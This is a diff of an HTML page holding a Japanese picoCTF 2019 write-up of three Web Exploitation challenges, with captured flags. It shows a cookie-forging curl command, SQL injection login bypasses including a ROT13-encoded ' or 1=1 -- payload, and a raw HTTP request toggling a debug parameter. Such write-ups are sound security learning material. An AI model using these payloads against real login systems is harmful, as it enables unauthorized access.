@@ -23,7 +23,7 @@
 <meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
 
 
-<meta name="generator" content="Hugo 0.59.1 with theme even" />
+<meta name="generator" content="Hugo 0.68.3 with theme even" />
 
 
 <link rel="canonical" href="https://captureamerica.github.io/writeups/post/picoctf_2019_web/" />
@@ -46,16 +46,13 @@
 <meta property="article:modified_time" content="2019-10-13T12:00:00+09:00" />
 <meta itemprop="name" content="picoCTF 2019 Writeup (Web Exploitation)">
 <meta itemprop="description" content="URL: https://2019game.picoctf.com/ 2週間、お疲れ様です。 最終結果は、こんな感じ。 イベント終了時点で、ユーザは4万人弱でした。 PwnとWeb系があんまりできてないけど、スコ">
-
-
 <meta itemprop="datePublished" content="2019-10-13T12:00:00&#43;09:00" />
 <meta itemprop="dateModified" content="2019-10-13T12:00:00&#43;09:00" />
-<meta itemprop="wordCount" content="550">
+<meta itemprop="wordCount" content="562">
 
 
 
-<meta itemprop="keywords" content="CTF," />
-<meta name="twitter:card" content="summary"/>
+<meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="picoCTF 2019 Writeup (Web Exploitation)"/>
 <meta name="twitter:description" content="URL: https://2019game.picoctf.com/ 2週間、お疲れ様です。 最終結果は、こんな感じ。 イベント終了時点で、ユーザは4万人弱でした。 PwnとWeb系があんまりできてないけど、スコ"/>
 
@@ -139,153 +136,116 @@
   <h2 class="post-toc-title">Contents</h2>
   <div class="post-toc-content">
     <nav id="TableOfContents">
-<ul>
-<li>
-<ul>
-<li><a href="#web-exploitation-open-to-admins-200-points">[Web Exploitation]: Open-to-admins (200 points)</a>
-<ul>
-<li><a href="#challenge">Challenge</a></li>
-<li><a href="#solution">Solution</a></li>
-</ul></li>
-<li><a href="#web-exploitation-irish-name-repo-2-350-points">[Web Exploitation]: Irish-Name-Repo 2 (350 points)</a>
-<ul>
-<li><a href="#challenge-1">Challenge</a></li>
-<li><a href="#solution-1">Solution</a></li>
-</ul></li>
-<li><a href="#web-exploitation-irish-name-repo-3-400-points">[Web Exploitation]: Irish-Name-Repo 3 (400 points)</a>
-<ul>
-<li><a href="#challenge-2">Challenge</a></li>
-<li><a href="#solution-2">Solution</a></li>
-</ul></li>
-</ul></li>
-</ul>
+  <ul>
+    <li><a href="#web-exploitation-open-to-admins-200-points">[Web Exploitation]: Open-to-admins (200 points)</a>
+      <ul>
+        <li><a href="#challenge">Challenge</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-exploitation-irish-name-repo-2-350-points">[Web Exploitation]: Irish-Name-Repo 2 (350 points)</a>
+      <ul>
+        <li><a href="#challenge-1">Challenge</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#web-exploitation-irish-name-repo-3-400-points">[Web Exploitation]: Irish-Name-Repo 3 (400 points)</a>
+      <ul>
+        <li><a href="#challenge-2">Challenge</a></li>
+        <li><a href="#solution-2">Solution</a></li>
+      </ul>
+    </li>
+  </ul>
 </nav>
   </div>
 </div>
     <div class="post-content">
-      
-
-<div class='align-right'>
-  
+      <div class='align-right'>
 <a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fpicoctf_2019_web%2F">
 <img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
 </a>
-
 </div>
-
-<p>URL: <a href="https://2019game.picoctf.com/" target="_blank">https://2019game.picoctf.com/</a>
+<p>URL: <a href="https://2019game.picoctf.com/">https://2019game.picoctf.com/</a>
 <br /><br />
 2週間、お疲れ様です。</p>
-
 <p><br /><br />
 最終結果は、こんな感じ。</p>
-
-<p><img src="https://captureamerica.github.io/writeups/img/pico2019_Score.png" alt="pico2019_Score.png"></p>
-
+<img src="https://captureamerica.github.io/writeups/img/pico2019_Score.png" alt="pico2019_Score.png">
 <p><br />
 イベント終了時点で、ユーザは4万人弱でした。</p>
-
-<p><img src="https://captureamerica.github.io/writeups/img/pico2019_Users.png" alt="pico2019_Users.png"></p>
-
-<p><img src="https://captureamerica.github.io/writeups/img/pico2019_Rank.png" alt="pico2019_Rank.png"></p>
-
+<img src="https://captureamerica.github.io/writeups/img/pico2019_Users.png" alt="pico2019_Users.png">
+<img src="https://captureamerica.github.io/writeups/img/pico2019_Rank.png" alt="pico2019_Rank.png">
 <p>PwnとWeb系があんまりできてないけど、スコアも切りのいい20000に行ったし、Globalで目標の300位以内 (283位) にも入れたのでかなり満足です。</p>
-
 <p>去年出た問題に似てるものも結構あったので、picoCTF 2018をそれなりにやった人は結構アドバンテージがあったと思います。</p>
-
 <p><br /><br />
 Web Exploitation の Writeupです。</p>
-
 <p><br /><br /></p>
-
 <h2 id="web-exploitation-open-to-admins-200-points">[Web Exploitation]: Open-to-admins (200 points)</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge">Challenge</h3>
-
 <blockquote>
-<p>This secure website allows users to access the flag only if they are admin and if the time is exactly 1400. <a href="https://2019shell1.picoctf.com/problem/32249/" target="_blank">https://2019shell1.picoctf.com/problem/32249/</a> (link) or <a href="http://2019shell1.picoctf.com:32249" target="_blank">http://2019shell1.picoctf.com:32249</a>
+<p>This secure website allows users to access the flag only if they are admin and if the time is exactly 1400. <a href="https://2019shell1.picoctf.com/problem/32249/">https://2019shell1.picoctf.com/problem/32249/</a> (link) or <a href="http://2019shell1.picoctf.com">http://2019shell1.picoctf.com</a>:32249
 <br /><br />
 Hints : Can cookies help you to get the flag?<br /></p>
 </blockquote>
-
 <p><br /></p>
-
 <h3 id="solution">Solution</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
-</span></pre></td>
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">curl -k -H &#39;Cookie: admin=True; time=1400&#39;  https://2019shell1.picoctf.com/problem/32249/flag</pre></td></tr></table>
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">curl -k -H &#39;Cookie: admin=True; time=1400&#39;  https://2019shell1.picoctf.com/problem/32249/flag
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>Flag: <code>picoCTF{0p3n_t0_adm1n5_cc661e91}</code></p>
-
+</div><p>Flag: <code>picoCTF{0p3n_t0_adm1n5_cc661e91}</code></p>
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="web-exploitation-irish-name-repo-2-350-points">[Web Exploitation]: Irish-Name-Repo 2 (350 points)</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-1">Challenge</h3>
-
 <blockquote>
-<p>There is a website running at <a href="https://2019shell1.picoctf.com/problem/60775/" target="_blank">https://2019shell1.picoctf.com/problem/60775/</a> (link). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or <a href="http://2019shell1.picoctf.com:60775" target="_blank">http://2019shell1.picoctf.com:60775</a>
+<p>There is a website running at <a href="https://2019shell1.picoctf.com/problem/60775/">https://2019shell1.picoctf.com/problem/60775/</a> (link). Someone has bypassed the login before, and now it&rsquo;s being strengthened. Try to see if you can still login! or <a href="http://2019shell1.picoctf.com">http://2019shell1.picoctf.com</a>:60775
 <br /><br />
 Hints : The password is being filtered.</p>
 </blockquote>
-
 <p><br /></p>
-
 <h3 id="solution-1">Solution</h3>
-
 <p>picoCTF 2018のVaultと同じ問題です。</p>
-
 <p>デバッグを見ようとして、以下を入れたら、Flag取れちゃった。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">username
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">username
 &#39; /*
 
 password
-*/ or 3=3 -- &amp;debug=1</pre></td></tr></table>
+*/ or 3=3 -- &amp;debug=1
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>Flag: <code>picoCTF{m0R3_SQL_plz_015815e2}</code></p>
-
+</div><p>Flag: <code>picoCTF{m0R3_SQL_plz_015815e2}</code></p>
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="web-exploitation-irish-name-repo-3-400-points">[Web Exploitation]: Irish-Name-Repo 3 (400 points)</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-2">Challenge</h3>
-
 <blockquote>
-<p>There is a secure website running at <a href="https://2019shell1.picoctf.com/problem/12271/" target="_blank">https://2019shell1.picoctf.com/problem/12271/</a> (link) or <a href="http://2019shell1.picoctf.com:12271" target="_blank">http://2019shell1.picoctf.com:12271</a>. Try to see if you can login as admin!
+<p>There is a secure website running at <a href="https://2019shell1.picoctf.com/problem/12271/">https://2019shell1.picoctf.com/problem/12271/</a> (link) or <a href="http://2019shell1.picoctf.com">http://2019shell1.picoctf.com</a>:12271. Try to see if you can login as admin!
 <br /><br />
 Hints : Seems like the password is encrypted.</p>
 </blockquote>
-
 <p><br /></p>
-
 <h3 id="solution-2">Solution</h3>
-
 <p>Burpでやったらdebug変数が見えたので、1に変えてみました。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -298,9 +258,9 @@ Hints : Seems like the password is encrypted.</p>
 </span><span class="lnt">11
 </span><span class="lnt">12
 </span><span class="lnt">13
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">POST /problem/12271/login.php HTTP/1.1
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">POST /problem/12271/login.php HTTP/1.1
 Host: 2019shell1.picoctf.com
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -312,46 +272,43 @@ Connection: close
 Referer: https://2019shell1.picoctf.com/problem/12271/login.html
 Upgrade-Insecure-Requests: 1
 
-password=admin&amp;debug=1</pre></td></tr></table>
+password=admin&amp;debug=1
+</code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">password: admin
-SQL query: SELECT * FROM admin where password = &#39;nqzva&#39;</pre></td></tr></table>
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">password: admin
+SQL query: SELECT * FROM admin where password = &#39;nqzva&#39;
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>'nqzva' は、'admin' のRot13ですね。</p>
-
+</div><p>&lsquo;nqzva&rsquo; は、&lsquo;admin&rsquo; のRot13ですね。</p>
 <p><br />
 いつものこの子を、</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
-</span></pre></td>
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">&#39; or 1=1 --</pre></td></tr></table>
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">&#39; or 1=1 --
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>Rot13して以下のようにします。</p>
+</div><p>Rot13して以下のようにします。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt">1
-</span></pre></td>
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">&#39; be 1=1 --</pre></td></tr></table>
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">&#39; be 1=1 --
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>Flag: <code>picoCTF{3v3n_m0r3_SQL_ef7eac2f}</code></p>
-
+</div><p>Flag: <code>picoCTF{3v3n_m0r3_SQL_ef7eac2f}</code></p>
 <p><br /><br />
 <br /><br /></p>
-
-<hr />
-
+<hr>
 <p><br /><br />
 <br /><br /></p>
 
